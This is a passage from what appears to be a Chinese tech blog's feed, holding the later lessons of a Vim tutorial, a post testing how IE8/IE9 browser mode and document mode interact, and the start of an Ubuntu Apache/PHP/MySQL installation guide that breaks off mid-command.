name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></p><p><span><span>** 输入 CTRL-g 显示当前编辑文件中当前光标所在行位置以及文件状态信息。</span>输入 SHIFT-G 则直接跳转到文件中的某一指定行。**</span></p><p><em><strong>  提示∶</strong>切记要先通读本节内容，之后才可以执行以下步骤!!!</em></p><p>  1. 按下 CTRL 键不放开然后按 g 键。然后就会看到页面最底部出现一个状态信     息行，显示的内容是当前编辑的文件名和文件的总行数。请记住步骤3的行号。</p><p>  2. 按下 SHIFT-G 键可以使得当前光标直接跳转到文件最后一行。</p><p>  3. 输入您曾停留的行号，然后按下 SHIFT-G。这样就可以返回到您第一次按下     CTRL-g 时所在的行好了。注意∶输入行号时，行号是不会在屏幕上显示出来     的。</p><p>  4. 如果愿意，您可以继续执行步骤1至步骤三。</p><p><strong>第二节∶搜索类命令<strong><strong><strong><strong><a id="skyking-4-2" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></p><p><span>** 输入 / 以及尾随的字符串可以用以在当前文件中查找该字符串。**</span></p><p>  1. 在正常模式下输入 / 字符。您此时会注意到该字符和光标都会出现在屏幕底     部，这跟 : 命令是一样的。</p><p>  2. 接着输入 errroor &lt;回车&gt;。那个errroor就是您要查找的字符串。</p><p>  3. 要查找同上一次的字符串，只需要按 n 键。要向相反方向查找同上一次的字     符串，请输入 Shift-N 即可。</p><p>  4. 如果您想逆向查找字符串，请使用 ? 代替 / 进行。</p><p>---&gt; When the search reaches the end of the file it will continue at the start.</p><p>  "errroor" is not the way to spell error;  errroor is an error.</p><p><em>  提示∶如果查找已经到达文件末尾，查找会自动从文件头部继续查找。</em></p><p><strong>第三节∶配对括号的查找<strong><strong><strong><strong><strong><a id="skyking-4-3" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></p><p><span>** 按 % 可以查找配对的括号 )、]、}。**</span></p><p>  1. 把光标放在本节下面标记有 --&gt; 那一行中的任何一个 (、[ 或 { 处。</p><p>  2. 接着按 % 字符。</p><p>  3. 此时光标的位置应当是在配对的括号处。</p><p>  4. 再次按 % 就可以跳回配对的第一个括号处。</p><p>---&gt; This ( is a test line with ('s, ['s ] and {'s } in it. ))</p><p><em>提示∶在程序调试时，这个功能用来查找不配对的括号是很有用的。</em></p><p><strong><span>第四节∶修正错误的方法之一<strong><strong><strong><strong><strong><a id="skyking-4-4" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></span></strong></p><p><span>** 输入 :s/old/new/g 可以替换 old 为 new。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的那一行。</p><p>  2. 输入<span> :s/thee/the &lt;回车&gt; </span>。请注意该命令只改变光标所在行的第一个匹配     串。</p><p>  3. 输入<span> :s/thee/the/g</span>  则是替换全行的匹配串。</p><p>---&gt; the best time to see thee flowers is in thee spring.</p><p>  4. 要替换两行之间出现的每个匹配串，请输入 :#,#s/old/new/g (#,#代表的是两行的行号)。输入 :%s/old/new/g 则是替换整个文件中的每个匹配串。</p><p><strong><span>第四讲小结<strong><strong><strong><strong><strong><a id="skyking-4-5" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></span></strong></p><p><span>1.<span> Ctrl-g</span> 用于显示当前光标所在位置和文件状态信息。Shift-G 用于将光标跳</span>     转至文件最后一行。先敲入一个行号然后按 Shift-G 则是将光标移动至该行     号代表的行。</p><p>  2. 输入 / 然后紧随一个字符串是则是在当前所编辑的文档中向后查找该字符串。     输入问号 ? 然后紧随一个字符串是则是在当前所编辑的文档中向前查找该字     符串。完成一次查找之后按 n 键则是重复上一次的命令，可在同一方向上查     找下一个字符串所在；或者按 Shift-N 向相反方向查找下该字符串所在。</p><p>  3. 如果光标当前位置是括号(、)、[、]、{、}，按 % 可以将光标移动到配对的     括号上。</p><p>  4. 在一行内替换头一个字符串 old 为新的字符串 new，请输入<span>  :s/old/new</span>     在一行内替换所有的字符串 old 为新的字符串 new，请输入<span>  :s/old/new/g</span>     在两行内替换所有的字符串 old 为新的字符串 new，请输入<span>  :#,#s/old/new/g</span>     在文件内替换所有的字符串 old 为新的字符串 new，请输入<span>  :%s/old/new/g</span>     进行全文替换时询问用户确认每个替换需添加 c 选项，请输入<span> :%s/old/new/gc</span></p><h3><a id="skyking-5" name="skyking-5" href="#">&nbsp;</a>第五讲</h3><p><strong>第一节∶在 VIM 内执行外部命令的方法<strong><strong><strong><strong><strong><a id="skyking-5-1" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></p><p><span>** 输入 :! 然后紧随著输入一个外部命令可以执行该外部命令。**</span></p><p>  1. 按下我们所熟悉的 : 命令设置光标到屏幕底部。这样就可以让您输入命令了。</p><p>  2. 接着输入感叹号 ! 这个字符，这样就允许您执行外部的 shell 命令了。</p><p>  3. 我们以 ls 命令为例。输入 !ls &lt;回车&gt; 。该命令就会列举出您当前目录的     内容，就如同您在命令行提示符下输入 ls 命令的结果一样。如果 !ls 没起     作用，您可以试试 :!dir 看看。</p><p>---&gt;<em><strong> 提示∶</strong> 所有的外部命令都可以以这种方式执行。</em></p><p>---&gt;<em><strong> 提示∶</strong> 所有的 : 命令都必须以 &lt;回车&gt; 告终。</em></p><p><strong><span>第二节∶关于保存文件的更多信息<strong><strong><strong><strong><strong><strong><a id="skyking-5-2" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></span></strong></p><p>      <span>** 要将对文件的改动保存到文件中，请输入 :w FILENAME 。**</span></p><p>  1. 输入 :!dir 或者 :!ls 获知当前目录的内容。您应当已知道最后还得敲     &lt;回车&gt; 吧。</p><p>  2. 选择一个尚未存在文件名，比如 TEST 。</p><p>  3. 接着输入 <span>:w TEST</span>  (此处 TEST 是您所选择的文件名。)</p><p>  4. 该命令会以 TEST 为文件名保存整个文件 (VIM 教程)。为了确保正确保存，     请再次输入 :!dir 查看您的目录列表内容。</p><p><em>---&gt; <strong>请注意∶</strong>如果您退出 VIM 然后在以文件名 TEST 为参数进入，那么该文件内</em><em>     容应该同您保存时的文件内容是完全一样的。</em></p><p>  5. 现在您可以通过输入 <span>:!rm TEST</span> 来删除 TEST 文件了。</p><p><strong>第三节∶一个具有选择性的保存命令<strong><span><strong><strong><strong><strong><strong><strong><a id="skyking-5-3" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></span></strong></strong></p><p><span>** 要保存文件的部分内容，请输入 :#,# w FILENAME **</span></p><p>  1. 再来执行一次<span> :!dir</span> 或者<span> :!ls</span> 获知当前目录的内容，然后选择一个合适的     不重名的文件名，比如 TEST 。</p><p>  2. 接着将光标移动至本页的最顶端，然后按<span> CTRL-g</span> 找到该行的行号。别忘了     行号哦。</p><p>  3. 接着把光标移动至本页的最底端，再按一次<span> CTRL-g</span> 。也别忘了这个行好哦。</p><p>  4. 为了只保存文章的某个部分，请输入<span> :#,# w TEST</span> 。这里的 #,# 就是上面     要求您记住的行号(顶端行号,底端行号)，而 TEST 就是选定的文件名。</p><p>  5. 最后，用<span> :!dir</span> 确认文件是否正确保存。但是这次先别删除掉。</p><p><strong><span>第四节∶提取和合并文件<strong><span><strong><strong><strong><strong><strong><strong><a id="skyking-5-4" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></span></strong></span></strong></p><p><span>** 要向当前文件中插入另外的文件的内容，请输入 :r FILENAME **</span></p><p>  1. 请键入<span> :!dir</span> 确认您前面创建的 TEST 文件还在。</p><p>  2. 然后将光标移动至当前页面的顶端。</p><p>特别提示∶ 执行步骤3之后您将看到第五讲第三节，请届时再往下移动回到这里来。</p><p>  3. 接着通过<span> :r TEST</span> 将前面创建的名为 TEST 的文件提取进来。</p><p>特别提示∶您所提取进来的文件将从光标所在位置处开始置入。</p><p>  4. 为了确认文件已经提取成功，移动光标回到原来的位置就可以注意有两份第     五讲第三节，一份是原本，另外一份是来自文件的副本。</p><p><strong>第五讲小结<strong><span><strong><strong><strong><strong><strong><strong><a id="skyking-5-5" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></span></strong></strong></p><p><span>1.<span> :!command</span> 用于执行一个外部命令 command。</span></p><p>     请看一些实际例子∶   <span>:!dir</span>  -  用于显示当前目录的内容。    <span>:!rm FILENAME</span>  -  用于删除名为 FILENAME 的文件。</p><p>  2. <span>:w FILENAME</span>  可将当前 VIM 中正在编辑的文件保存到名为 FILENAME 的文     件中。</p><p>  3. <span>:#,#w FILENAME</span> 可将当前编辑文件第 # 行至第 # 行的内容保存到文件     FILENAME 中。</p><p>  4.<span> :r FILENAME</span> 可提取磁盘文件 FILENAME 并将其插入到当前文件的光标位置     后面。</p><h3><a id="skyking-6" name="skyking-6" href="#">&nbsp;</a>       第六讲</h3><p><strong>第一节∶打开类命令<strong><span><strong><strong><strong><strong><strong><strong><a id="skyking-6-1" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></span></strong></strong></p><p><span>  ** 输入 o 将在光标的下方打开新的一行并进入插入模式。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的那一行。</p><p>  2. 接着输入小写的 o 在光标 *下方* 打开新的一行并进入插入模式。</p><p>  3. 然后复制标记有 ---&gt; 的行并按 &lt;ESC&gt; 键退出插入模式而进入正常模式。</p><p>---&gt; After typing  o  the cursor is placed on the open line in Insert mode.</p><p>  4. 为了在光标 *上方* 打开新的一行，只需要输入大写的 O 而不是小写的 o     就可以了。请在下行测试一下吧。当光标处在在该行上时，按 Shift-O可以     在该行上方新开一行。</p><p>Open up a line above this by typing Shift-O while the cursor is on this line.</p><p><strong><span>第二节∶光标后插入类命令<strong><strong><strong><strong><strong><strong><strong><strong><a id="skyking-6-2" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></strong></strong></span></strong></p><p><span>** 输入 a 将可在光标之后插入文本。 **</span></p><p>  1. 请在正常模式下通过输入 $ 将光标移动到本节中下面标记有 ---&gt; 的第一行     的末尾。</p><p>  2. 接着输入小写的 a 则可在光标之后插入文本了。大写的 A 则可以直接在行     末插入文本。</p><p><em>提示∶输入大写 A 的操作方法可以在行末插入文本，避免了输入 i，光标定位到</em><em>      最后一个字符，输入的文本，&lt;ESC&gt; 回复正常模式，箭头右键移动光标以及</em><em>      x 删除当前光标所在位置字符等等诸多繁杂的操作。</em></p><p>  3. 操作之后第一行就可以补充完整了。请注意光标后插入文本与插入模式是基     本完全一致的，只是文本插入的位置定位稍有不同罢了。</p><p>---&gt; This line will allow you to practice---&gt; This line will allow you to practice appending text to the end of a line.</p><p><strong><span>第三节∶另外一个置换类命令的版本<strong><strong><strong><strong><strong><strong><strong><strong><a id="skyking-6-3" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></strong></strong></span></strong></p><p><span>** 输入大写的 R 可连续替换多个字符。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的第一行。</p><p>  2. 移动光标到第一行中不同于标有 ---&gt; 的第二行的第一个单词的开始，即单     词 last 处。</p><p>  3. 然后输入大写的 R 开始把第一行中的不同于第二行的剩余字符逐一输入，就     可以全部替换掉原有的字符而使得第一行完全雷同第二行了。</p><p>---&gt; To make the first line the same as the last on this page use the keys.---&gt; To make the first line the same as the second, type R and the new text.</p><p>  4. 请注意∶如果您按 &lt;ESC&gt; 退出置换模式回复正常模式，尚未替换的文本将仍     然保持原状。</p><p><strong><span>第四节∶设置类命令的选项<strong><strong><strong><strong><strong><strong><strong><strong><a id="skyking-6-4" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></strong></strong></span></strong></p><p><span>** 设置可使查找或者替换可忽略大小写的选项 **</span></p><p><span>1. 要查找单词 ignore 可在正常模式下输入 /ignore 。要重复查找该词，可以</span>     重复按 n 键。</p><p>  2. 然后设置 ic 选项(ic就是英文忽略大小写Ignore Case的首字母缩写词)，即     输入∶ <span>:set ic</span></p><p>  3. 现在可以通过键入 n 键再次查找单词 ignore。重复查找可以重复键入 n 键。</p><p>  4. 然后设置 hlsearch 和 incsearch 这两个选项，输入以下内容∶     <span>:set hls is</span></p><p>  5. 现在可以再次输入查找命令，看看会有什么效果∶     <span>/ignore</span></p><p><strong>第六讲 小结<strong><strong><strong><strong><strong><strong><strong><strong><a id="skyking-6-5" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p><span>1. 输入小写的 o 可以在光标下方打开新的一行并将光标置于新开的行首，进入</span>     插入模式。     输入大写的 O 可以在光标上方打开新的一行并将光标置于新开的行首，进入     插入模式。</p><p>  2. 输入小写的 a 可以在光标所在位置之后插入文本。     输入大写的 A 可以在光标所在行的行末之后插入文本。</p><p>  3. 输入大写的 R 将进入替换模式，直至按 &lt;ESC&gt; 键退出替换模式而进入正常     模式。</p><p>  4. 输入<span> :set xxx</span> 可以设置 xxx 选项。</p><h3><a id="skyking-7" name="skyking-7" href="#">&nbsp;</a><span>第七讲∶在线帮助命令</span></h3><p><span>         ** 使用在线帮助系统 **</span></p><p>  Vim 拥有一个细致全面的在线帮助系统。要启动该帮助系统，请选择如下三种方  法之一∶  - 按下 &lt;HELP&gt; 键 (如果键盘上有的话)  - 按下 &lt;F1&gt; 键 (如果键盘上有的话)  - 输入  :help &lt;回车&gt;</p><p>  输入 :q &lt;回车&gt; 可以关闭帮助窗口。</p><p>  提供一个正确的参数给":help"命令，您可以找到关于该主题的帮助。请试验以  下参数(可别忘了按回车键哦。:)∶</p><p><span>   :help w &lt;回车&gt;</span><span>    :help c_&lt;T &lt;回车&gt;</span><span>    :help insert-index &lt;回车&gt;</span><span>   :help user-manual &lt;回车&gt;</span></p><h3><a id="skyking-8" name="skyking-8" href="#">&nbsp;</a><span>第八讲∶创建一个启动脚本</span></h3><p><span>       ** 启用vim的功能 **</span></p><p>  Vim的功能特性要比vi多得多，但大部分功能都没有缺省激活。为了启动更多的功能，您得创建一个vimrc文件。</p><p>  1. 开始编辑vimrc文件，这取决于您所使用的操作系统∶</p><p><span>     :edit ~/.vimrc    这是Unix系统所使用的命令</span><span>     :edit $VIM/_vimrc    这是Windows系统所使用的命令</span></p><p>  2. 接着导入vimrc范例文件∶</p><p><span>     :read $VIMRUNTIME/vimrc_example.vim</span></p><p>  3. 保存文件，命令为∶</p><p><span>     :write</span></p><p>  在下次您启动vim的时候，编辑器就会有了语法高亮的功能。您可以继续把您喜欢的其它功能设置添加到这个vimrc文件中。</p><h3>结语</h3><p>  vim 教程到此结束。本教程只是为了简明地介绍一下vim编辑器，但已足以让您很容易学会使用本编辑器了。毋庸质疑，vim还有很多很多的命令，本教程所介绍的还差得远著呢。所以您要精通的话，还望继续努力哦。下一步您可以阅读  vim手册，使用的命令是∶  <span>:help user-manual</span></p><p>  为了更进一步的参考和学习，以下这本书值得推荐∶</p><blockquote><p><span>Vim - Vi Improved - 作者∶Steve Oualline</span>出版社∶New Riders</p></blockquote><p>  这是第一本完全讲解vim的书籍。对于初学者特别有用。其中还包含有大量实例和图示。欲知详情，请访问 <a href="http://iccf-holland.org/click5.html" target="_blank">http://iccf-holland.org/click5.html</a></p><p>  以下这本书比较老了而且内容主要是vi而不是vim，但是也值得推荐∶</p><blockquote><p>Learning the Vi Editor - 作者∶Linda Lamb出版社∶O'Reilly < Associates Inc.</p></blockquote><p><span>这是一本不错的书，通过它您几乎能够了解到全部vi能够做到的事情。此书的第</span></p><p>  六个版本也包含了一些关于vim的信息。</p><p>GVIM中的教程，觉得不错，放到这里分享~ 我所做的工作就是将其格式化，让读者便于阅读 :)</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> VIM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于浏览器模式和文本模式的困惑</title>
      <link href="/blog/2013/06/08/cb-browser-mode-and-doccument-mode/"/>
      <url>/blog/2013/06/08/cb-browser-mode-and-doccument-mode/</url>
      
        <content type="html"><![CDATA[<h4>什么是浏览器模式和文本模式？</h4><p>经常使用IE开发者工具的同学，肯定见过浏览器模式和文本模式，对于这两个名词，综合相关文档解释如下：</p><p><strong>浏览器模式</strong>（Browser Mode），用于切换IE针对该网页的默认文本模式、对不同版本浏览器的条件注释解析、决定请求头里userAgent的值。它在浏览器发出请求之前就已经确定，网站没有办法修改这个值。它代表的是用户以何种浏览器访问网站。IE9支持下列浏览器模式：</p><table border="1"><tbody><tr><th>&nbsp;</th><th>userAgent</th><th>默认文本模式</th></tr><tr><td><em>IE7</em></td><td>MSIE 7.0</td><td><em>IE7标准</em></td></tr><tr><td><em>IE8</em></td><td>MSIE 8.0 && Trident/4.0</td><td><em>IE8标准</em></td></tr><tr><td><em>IE9</em></td><td>MSIE 9.0 && Trident/5.0</td><td><em>IE9标准</em></td></tr><tr><td><em>IE9兼容性</em></td><td>MSIE 7.0 && Trident/5.0</td><td><em>IE7标准</em></td></tr></tbody></table><p>（<em>IE9兼容性</em>模式与<em>IE7</em>模式的区别是：前者在UA里加上了Trident版本，后者和IE7完全一致无Trident标识；IE8中，<em>IE9兼容性</em>模式对应为<em>IE8兼容性</em>模式，UA里Trident版本为4.0，其他没变化。另，IE8中没有<em>IE9模式</em>）<span id="more-94"></span></p><p><strong>文本模式</strong>（Document Mode），其实就是经常说的文档模式。不同的文本模式对应不同的排版引擎，不同的JS引擎。上面提到，每一种浏览器模式对应一种默认的文本模式，网站还可以通过一些手段来更改文本模式，它代表的是浏览器以何种模式呈现页面。IE9有下列文本模式：</p><table border="1"><tbody><tr><th>&nbsp;</th><th>documentMode</th></tr><tr><td><em>IE7标准</em></td><td>7</td></tr><tr><td><em>IE8标准</em></td><td>8</td></tr><tr><td><em>IE9标准</em></td><td>9</td></tr><tr><td><em>怪异</em>（Quirks）</td><td>5</td></tr></tbody></table><p>（需要说明的是，IE8开始支持的渲染机制有：怪异模式（quirks mode）、完全标准模式（standards mode）和近似标准模式（almost standards mode），但开发者工具是无法选择近似标准模式的，实际上我们一般都选择触发完全标准模式）</p><h4>浏览器模式和文本模式有什么用？</h4><p>用来解决IE各版本带来的兼容性问题。根据微软描述的IE兼容性策略，在IE8+访问一个页面要经过这样的流程：</p><p><strong>一、</strong>首先，浏览器要确定浏览器模式。上面说过，浏览器模式是在请求发送之前就必须确定，默认取最新（IE9为<em>IE9标准</em>，IE8为<em>IE8标准</em>），有两种方式可以更改它：</p><ul><li>通过开发者工具选择（可选项见上表）；</li><li>通过点击兼容性视图按钮；</li><li>命中兼容性视图列表（微软维护的需要采用兼容性视图的列表。IE8+默认对这个列表和局域网的网址都会采用<em>相应的兼容性</em>模式）；</li></ul><p><strong>二、</strong>浏览器通过请求头里userAgent的值，告诉服务器当前是何种浏览器模式；</p><p><strong>三、</strong>服务器可以通过下面方式改变浏览器文本模式：</p><ul><li>doctype；</li><li>X-UA-Compatible Meta或对应的响应头；</li></ul><p><strong>四、</strong>浏览器综合考虑开发者工具设置、第三步服务器返回的设置、兼容性列表设置等等情况，决定页面使用何种文本模式。这个过程有点复杂，放一张Qwrap群里灰大提供的流程图，可以自己点开看大图。</p><p><a href="http://st.imququ.com/uploads/2012/02/ie9.jpg"><img src="https://st.imququ.com/uploads/2012/02/m_ie9.jpg" alt="" width="500" height="875"></a></p><p>（上图是IE9选取文本模式的流程图，<a href="http://st.imququ.com/uploads/2012/02/ie8.png">这里还有IE8版本</a>，有一些区别）</p><h4>问题终于来了！</h4><p>回顾下前面的介绍，浏览器模式决定：1）发送给服务端的UA；2）默认的文本模式；3）如何解析条件注释。它在请求发送前就已经确定，且不受服务端控制。文本模式决定：1）排版引擎；2）JS引擎。它在浏览器得到响应后最终确定，服务端可通过doctype或X-UA-Compatible来控制。</p><p><strong>测试一、</strong>根据前文，如果用户浏览器没有激活兼容性视图；没有开启IE开发者工具。那么IE9的浏览器模式默认为<em>IE9</em>，默认对应的文本模式应该是<em>IE9标准</em>（对于IE8来说，是类似的），我们通过下列代码将它改到<em>IE7标准</em>：</p><div><div id="highlighter_562551" class="syntaxhighlighter nogutter  html"><div class="toolbar">&nbsp;<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;IE=7&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><p>下面，我们分别用原生IE8、IE9测试<a href="http://qgy18.imququ.com/file/test0.html">这个页面</a>：</p><table border="1"><tbody><tr><th>&nbsp;</th><th>请求头UA</th><th>navigator.userAgent</th><th>条件注释</th><th>documentMode</th><th>JS引擎</th></tr><tr><td>IE8</td><td>MSIE 8.0 && Trident/4.0</td><td>MSIE 8.0 && Trident/4.0</td><td><em>IE7</em></td><td>7</td><td><em>IE7</em></td></tr><tr><td>IE9</td><td>MSIE 9.0 && Trident/5.0</td><td>MSIE 7.0 && Trident/5.0</td><td><em>IE7</em></td><td>7</td><td><em>IE7</em></td></tr></tbody></table><p>上表说明，浏览器发送请求时的浏览器模式符合预期（根据请求头UA），X-UA-Compatible确实会将浏览器文本模式改到了<em>IE7标准</em>（根据documentMode和JS引擎）。奇怪的是，文本模式的改变导致了浏览器模式的改变，因为条件注释是由浏览器模式决定的。本例中，文本模式改到<em>IE7标准</em>，条件注释也跟着变成<em>IE7</em>，意味着浏览器模式变到<em>IE9/IE8兼容性</em>（从IE9的测试来看，不能是<em>IE7</em>，因为UA里包含Trident）。至于IE8中JS取到的UA为什么没有变化，可能是bug或者理解不一致。</p><p><strong>测试二、</strong>那如果把测试地址加到兼容性列表呢？根据前文，这种情况浏览器模式应该是<em>IE9/IE8兼容性</em>，对应的文本模式依然是<em>IE7标准</em>。测试结果如下：</p><table border="1"><tbody><tr><th>&nbsp;</th><th>请求头UA</th><th>navigator.userAgent</th><th>条件注释</th><th>documentMode</th><th>JS引擎</th></tr><tr><td>IE8</td><td>MSIE 7.0 && Trident/4.0</td><td>MSIE 7.0 && Trident/4.0</td><td><em>IE7</em></td><td>7</td><td><em>IE7</em></td></tr><tr><td>IE9</td><td>MSIE 7.0 && Trident/5.0</td><td>MSIE 7.0 && Trident/5.0</td><td><em>IE7</em></td><td>7</td><td><em>IE7</em></td></tr></tbody></table><p>上表是完全符合预期的。</p><p><strong>测试三、</strong>如果把X-UA-Compatible改成IE=edge，继续使用兼容性模式测试呢？结论如下：</p><table border="1"><tbody><tr><th>&nbsp;</th><th>请求头UA</th><th>navigator.userAgent</th><th>条件注释</th><th>documentMode</th><th>JS引擎</th></tr><tr><td>IE8</td><td>MSIE 7.0 && Trident/4.0</td><td>MSIE 7.0 && Trident/4.0</td><td><em>IE8</em></td><td>8</td><td><em>IE8</em></td></tr><tr><td>IE9</td><td>MSIE 7.0 && Trident/5.0</td><td>MSIE 9.0 && Trident/5.0</td><td><em>IE9</em></td><td>9</td><td><em>IE9</em></td></tr></tbody></table><p>这个结论其实跟测试一是一致的：X-UA-Compatible为IE=edge，意味着文本模式会使用最新可用的版本，然而文本模式的更改，又把浏览器模式从<em>IE9/IE8兼容性</em>变成<em>IE9/IE8</em>。IE9会按照新的浏览器模式来设置JS的navigator.userAgent，IE8下JS的UA不变。</p><p><strong>测试四、</strong>那如果通过开发者工具人为设置浏览器模式和文本模式呢？经过测试，这样测试都是符合预期的。例如IE9下，设置浏览器模式为<em>IE8</em>，文本模式为<em>IE7标准</em>，请求头UA、JS的UA、条件注释都表明浏览器模式是<em>IE8</em>，documentMode和JS引擎都表明文本模式是<em>IE7标准</em>。因为，IE开发者工具的优先级最高，设置了这个，其他条件统统无视！</p><h3>结论</h3><p>IE8/9中X-UA-Compatible对文本模式的改变会导致浏览器模式的改变，也就是说服务端可以间接控制浏览器模式。这与微软文档里这一段描述有出入：</p><blockquote><p>An important detail to remember is that&nbsp;<strong><em>Browser Mode is chosen before IE requests web content</em></strong>. This means that&nbsp;<strong>sites cannot choose a Browser Mode</strong>.</p></blockquote><p>对于IE8，如果网站通过X-UA-Compatible meta/header更改文本模式为当前浏览器模式默认文本模式之外的值，那么页面将按照新的文本模式来呈现，条件注释也按照新的文本模式对应的浏览器模式来解析，但是JS获取的UA是浏览器模式初始状态。这样会导致用JS获取UA得到的浏览器版本，与实际渲染的浏览器版本不符，这会对基于UA的浏览器检测造成干扰。</p><p>对于IE9，只有一点与IE8不同：JS获取到的是新文本模式对应的浏览器模式的UA。这会导致用JS获取UA得到的浏览器版本，与请求头发送给服务器UA里标识的浏览器版本不符，这可能对统计有影响。</p><p>对于IE这种兼容性方案，几乎不可能做到理论上的完美。个人感觉还是IE9的策略影响面较小，更好一些。</p><p>PS，上述结论都是我用Windows XP的原生IE8，Windows 7的原生IE9亲自测试得出来的。对于国内那些IE Shell们，实在过于奇葩，不在本文范围内。</p><p>参考：</p><ol><li><a href="http://blogs.msdn.com/b/ie/archive/2010/10/19/testing-sites-with-browser-mode-vs-doc-mode.aspx">Testing sites with Browser Mode vs. Doc Mode</a></li><li><a href="http://www.zachleat.com/web/et-tu-x-ua-compatible/">X-UA-Compatible header/meta tag is NOT the same as the Internet Explorer 8+ Compatibility View button</a></li></ol><p>原文链接：<a title="Permalink to 关于浏览器模式和文本模式的困惑" href="http://www.imququ.com/post/browser-mode-and-document-mode-in-ie.html" rel="bookmark">http://www.imququ.com/post/browser-mode-and-document-mode-in-ie.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu下安装Apache+PHP+Mysql</title>
      <link href="/blog/2013/06/08/cb-apache-php-mysql/"/>
      <url>/blog/2013/06/08/cb-apache-php-mysql/</url>
      
        <content type="html"><![CDATA[<p><span>通过Apache我们可以学习php网络编程，可以用它来部署自己本地的wordpress博客，从而进一步通过网络和朋友交流。从此，你将深刻体会到网络带个我们的神奇力量，至少我是这样觉得的～～</span></p><p><span>步骤一，安装apache2</span></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install apache2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>安装完成。&nbsp;</span></p><p>运行如下命令重启下：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/apache2 restart</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>在浏览器里输入http://localhost或者是http://127.0.0.1，如果看到了It works!，那就说明Apache就成功的安装了，Apache的默认安装，会在/var下建立一个名为www的目录，这个就是Web目录了，所有要能过浏览器访问的Web文件都要放到这个目录里。</span></p><p><span>步骤二 ，安装php:</span></p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install libapache2-<span class="keyword">mod</span>-php5 php5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外，建议安装扩展php5-gd php5-mysql，安装方式同上.</p><p>安装完后，我们要重新启动Apache，让它加载PHP模块：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/apache2 restart</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>接下来，我们就在Web目录下面新建一个test.php文件来测试PHP是否能正常的运行，命令：</span></p><div><div id="highlighter_322963" class="syntaxhighlighter  cpp"><div class="toolbar"><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo gedit <span class="regexp">/var/</span>www/test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>然后输入:</span></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;hello,world!!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;<span>接着保存文件,在浏览器里输入http://127.0.0.1/test.php，如果在网页中显示hello,world!!，那就说明PHP已经正常运行了。</span></p></div></div></div><p><span>步骤三,安装mysql数据库:</span></p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">sudo apt-get install mysql-<span class="keyword">server</span> mysql-<span class="keyword">client</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;<span>apt-get程序会自动下载安装最新的mysql版本。在安装的最后，它会要求里输入root的密码，注意，这里的root密码可不是Ubuntu的root密码啊，是你要给MySQL设定的root密码。</span></p><p><span>步骤四,安装phpmyadmin-Mysql数据库管理</span></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install phpmyadmin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>phpmyadmin设置：</span></p><p>在安装过程中会要求选择Web server：apache2或lighttpd，使用空格键选定apache2，按tab键然后确定。然后会要求输入设置的Mysql数据库密码连接密码Password of the database"s administrative user。</p><p>然后将phpmyadmin与apache2建立连接，以我的为例：www目录在/var/www，phpmyadmin在/usr/share /phpmyadmin目录，所以就用命令：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo ln -s <span class="regexp">/usr/</span>share<span class="regexp">/phpmyadmin /</span>var/www</span><br><span 